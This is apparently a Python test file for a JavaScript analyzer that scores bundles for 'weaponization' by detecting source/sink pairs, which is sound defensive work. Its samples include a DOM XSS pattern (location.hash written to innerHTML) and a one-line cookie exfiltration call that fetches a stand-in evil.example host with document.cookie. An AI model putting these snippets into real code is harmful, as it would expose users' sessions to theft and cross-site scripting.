"""JS weaponization assessment: sink/source pair detection + threshold."""

from ai_osop.agents.js_analyzer_agent import JSAnalyzerAgent


def test_weaponization_flags_dom_xss_pair():
    bundle = """
      var h = location.hash.slice(1);
      document.getElementById('x').innerHTML = h;
    """
    out = JSAnalyzerAgent.weaponization_assessment(bundle, secrets_live=0)
    assert out["weaponization_score"] >= 0.2
    assert any(
        p["sink"] == "innerHTML" and "location.hash" in p["source"] for p in out["pairs"]
    )


def test_weaponization_flags_cookie_exfil():
    bundle = "fetch('https://evil.example/c?c=' + document.cookie)"
    out = JSAnalyzerAgent.weaponization_assessment(bundle, secrets_live=1)
    assert out["weaponization_score"] >= 0.4  # 0.3 secret + 0.2 pair


def test_benign_bundle_scores_zero():
    out = JSAnalyzerAgent.weaponization_assessment("const a = 1 + 1;", secrets_live=0)
    assert out["weaponization_score"] == 0.0
    assert out["pairs"] == []
